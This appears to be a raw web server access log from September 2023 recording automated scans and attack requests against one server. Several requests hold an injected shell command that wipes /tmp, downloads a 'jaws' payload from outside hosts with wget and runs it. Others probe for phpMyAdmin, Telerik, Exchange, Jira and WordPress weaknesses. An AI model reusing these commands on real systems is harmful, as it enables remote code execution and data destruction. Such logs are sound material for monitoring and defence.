45.156.129.12 - - [08/Sep/2023:04:16:12 +0900] "GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
199.123.2.129 - - [08/Sep/2023:05:15:58 +0900] "GET /shell?cd+/tmp;rm+-rf+*;wget+121.62.21.23/jaws;sh+/tmp/jaws HTTP/1.1" 404 12981 "-" "Hello, world"
112.4.71.246 - - [08/Sep/2023:09:18:05 +0900] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 81.161.229.185/jaws;sh+/tmp/jaws HTTP/1.1" 400 157 "-" "-"
20.83.160.122 - - [08/Sep/2023:20:36:07 +0900] "GET /login?pp=enable&pp=env HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.82"
8.222.223.231 - - [09/Sep/2023:09:11:13 +0900] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 95.214.24.125/jaws;sh+/tmp/jaws HTTP/1.1" 400 157 "-" "-"
20.83.160.122 - - [09/Sep/2023:14:20:14 +0900] "GET /login?pp=enable&pp=env HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
81.26.201.8 - - [09/Sep/2023:16:24:51 +0900] "GET http://180.63.127.8:80/phpMyAdmin-2.11.4/scripts/setup.php HTTP/1.0" 404 12981 "-" "-"
209.38.238.131 - - [09/Sep/2023:19:34:10 +0900] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/2.0" 404 4598 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
185.20.54.102 - - [09/Sep/2023:19:38:52 +0900] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
185.20.54.102 - - [09/Sep/2023:19:38:54 +0900] "GET /phpMyAdmin-5.3.0-all-languages/index.php?lang=en HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
185.20.54.102 - - [09/Sep/2023:19:38:57 +0900] "GET /phpMyAdmin-4.9.10-all-languages/index.php?lang=en HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
185.20.54.102 - - [09/Sep/2023:19:38:59 +0900] "GET /phpMyAdmin-5.2.0-all-languages/index.php?lang=en HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
185.20.54.102 - - [09/Sep/2023:19:39:09 +0900] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
185.20.54.102 - - [09/Sep/2023:19:39:15 +0900] "GET /phpMyAdmin-5.3.0-all-languages/index.php?lang=en HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36"
74.207.237.46 - - [10/Sep/2023:01:04:28 +0900] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 401 179 "-" "Go-http-client/1.1"
74.207.237.46 - - [10/Sep/2023:01:04:32 +0900] "GET /s/83e2732313e23363e2038313/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.1" 401 179 "-" "Go-http-client/1.1"
74.207.237.46 - - [10/Sep/2023:01:04:33 +0900] "GET /?rest_route=/wp/v2/users/ HTTP/1.1" 401 179 "-" "Go-http-client/1.1"
1.224.49.15 - - [10/Sep/2023:14:45:02 +0900] "GET /shell?cd+/tmp;rm+-rf+*;wget+121.62.21.23/jaws;sh+/tmp/jaws HTTP/1.1" 404 12981 "-" "Hello, world"
194.38.22.71 - - [11/Sep/2023:03:48:07 +0900] "GET /wp-content/plugins/simple-forum/resources/jscript/ajaxupload/ajaxupload.js HTTP/1.1" 404 12981 "-" "ALittle Client"
185.180.143.141 - - [11/Sep/2023:05:44:36 +0900] "GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1" 404 4611 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
172.190.211.73 - - [12/Sep/2023:04:52:42 +0900] "GET http://180.63.127.8:80/phpMyAdmin/scripts/setup.php HTTP/1.0" 404 12981 "-" "-"
172.190.211.73 - - [12/Sep/2023:04:52:42 +0900] "GET http://180.63.127.8:80/phpmyadmin/scripts/setup.php HTTP/1.0" 404 12981 "-" "-"
172.190.211.73 - - [12/Sep/2023:04:52:42 +0900] "GET http://180.63.127.8:80/phpMyAdmin-2.11.4/scripts/setup.php HTTP/1.0" 404 12981 "-" "-"
